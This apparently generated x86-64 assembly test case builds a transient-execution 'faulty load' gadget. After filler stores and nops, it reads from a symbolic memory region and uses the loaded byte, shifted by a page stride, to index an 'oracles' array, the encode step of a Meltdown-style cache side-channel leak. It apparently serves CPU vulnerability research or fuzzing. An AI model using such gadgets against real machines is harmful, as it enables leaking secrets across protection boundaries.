.global s_prepare_buffers
s_prepare_buffers:
push %r10
push %r9
push %rbx
push %rcx
push %rdi
push %rsi
lea addresses_D_ht+0xd7ec, %rsi
lea addresses_WT_ht+0xea4c, %rdi
nop
nop
inc %r9
mov $4, %rcx
rep movsl
nop
nop
nop
and $62753, %r10
lea addresses_D_ht+0xc3dc, %rsi
lea addresses_WT_ht+0x1c6ec, %rdi
nop
nop
nop
add %rbx, %rbx
mov $59, %rcx
rep movsb
sub %rbx, %rbx
pop %rsi
pop %rdi
pop %rcx
pop %rbx
pop %r9
pop %r10
ret

    .global s_faulty_load
s_faulty_load:
push %r12
push %r14
push %r8
push %r9
push %rax
push %rbp
push %rdx

// Store
lea addresses_A+0xd29c, %r9
add $2382, %r12
movw $0x5152, (%r9)
nop
nop
and $24622, %rdx

// Store
lea addresses_UC+0x11324, %r9
xor $34154, %r14
movw $0x5152, (%r9)
nop
nop
add %rax, %rax

// Store
lea addresses_normal+0x16eac, %r8
nop
add $50990, %r14
mov $0x5152535455565758, %rbp
movq %rbp, %xmm4
vmovups %ymm4, (%r8)
nop
nop
nop
nop
nop
sub %r12, %r12

// Store
lea addresses_RW+0x1916c, %r8
clflush (%r8)
cmp $45201, %r14
movw $0x5152, (%r8)
nop
nop
nop
inc %r9

// Store
lea addresses_WT+0x159ec, %r12
nop
nop
nop
and $9725, %rdx
mov $0x5152535455565758, %r8
movq %r8, (%r12)
nop
nop
nop
nop
nop
and %r9, %r9

// Store
lea addresses_A+0x474c, %rbp
clflush (%rbp)
nop
inc %r9
movw $0x5152, (%rbp)
nop
nop
nop
nop
nop
inc %rbp

// Load
lea addresses_UC+0x13ec, %r14
nop
nop
dec %rax
movb (%r14), %r12b
nop
nop
and $1895, %rax

// Faulty Load
lea addresses_RW+0x5bec, %r14
nop
and $1450, %r9
mov (%r14), %rdx
lea oracles, %r12
and $0xff, %rdx
shlq $12, %rdx
mov (%r12,%rdx,1), %rdx
pop %rdx
pop %rbp
pop %rax
pop %r9
pop %r8
pop %r14
pop %r12
ret

/*
<gen_faulty_load>
[REF]
{'src': {'congruent': 0, 'AVXalign': False, 'same': True, 'size': 8, 'NT': False, 'type': 'addresses_RW'}, 'OP': 'LOAD'}
{'OP': 'STOR', 'dst': {'congruent': 3, 'AVXalign': False, 'same': False, 'size': 2, 'NT': True, 'type': 'addresses_A'}}
{'OP': 'STOR', 'dst': {'congruent': 3, 'AVXalign': False, 'same': False, 'size': 2, 'NT': False, 'type': 'addresses_UC'}}
{'OP': 'STOR', 'dst': {'congruent': 3, 'AVXalign': False, 'same': False, 'size': 32, 'NT': False, 'type': 'addresses_normal'}}
{'OP': 'STOR', 'dst': {'congruent': 7, 'AVXalign': False, 'same': False, 'size': 2, 'NT': False, 'type': 'addresses_RW'}}
{'OP': 'STOR', 'dst': {'congruent': 9, 'AVXalign': False, 'same': False, 'size': 8, 'NT': False, 'type': 'addresses_WT'}}
{'OP': 'STOR', 'dst': {'congruent': 4, 'AVXalign': False, 'same': False, 'size': 2, 'NT': False, 'type': 'addresses_A'}}
{'src': {'congruent': 10, 'AVXalign': False, 'same': False, 'size': 1, 'NT': False, 'type': 'addresses_UC'}, 'OP': 'LOAD'}
[Faulty Load]
{'src': {'congruent': 0, 'AVXalign': False, 'same': True, 'size': 8, 'NT': False, 'type': 'addresses_RW'}, 'OP': 'LOAD'}
<gen_prepare_buffer>
{'src': {'congruent': 9, 'same': False, 'type': 'addresses_D_ht'}, 'OP': 'REPM', 'dst': {'congruent': 3, 'same': True, 'type': 'addresses_WT_ht'}}
{'src': {'congruent': 4, 'same': False, 'type': 'addresses_D_ht'}, 'OP': 'REPM', 'dst': {'congruent': 7, 'same': False, 'type': 'addresses_WT_ht'}}
{'32': 7}
32 32 32 32 32 32 32
*/
